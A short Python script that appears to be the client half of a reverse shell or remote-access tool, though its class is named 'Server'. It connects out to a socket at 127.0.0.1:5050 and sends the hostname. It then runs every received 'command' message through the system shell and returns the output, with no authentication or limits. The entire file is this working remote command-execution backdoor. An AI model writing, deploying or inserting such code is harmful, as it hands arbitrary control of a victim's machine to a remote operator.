import socket, json, subprocess




class Server:
    def __init__(self) -> None:
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def Start(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect(("127.0.0.1", 5050))
        self.Initilize()
        self.Handle()
        

    def Initilize(self):
        self.s.send(socket.gethostname().encode())
        message = self.s.recv(1024).decode()
        print(message)

    def Handle(self):

        while True:
            message = json.loads(self.s.recv(1024).decode())

            if message[1] == "command":
                try:
                    output = subprocess.check_output(message[0], shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
                    print(output)
                    self.s.send(output.strip().encode())
                except Exception as e:
                    self.s.send(f"{e}".encode())
                    pass

if __name__ == "__main__":
    Server().Start()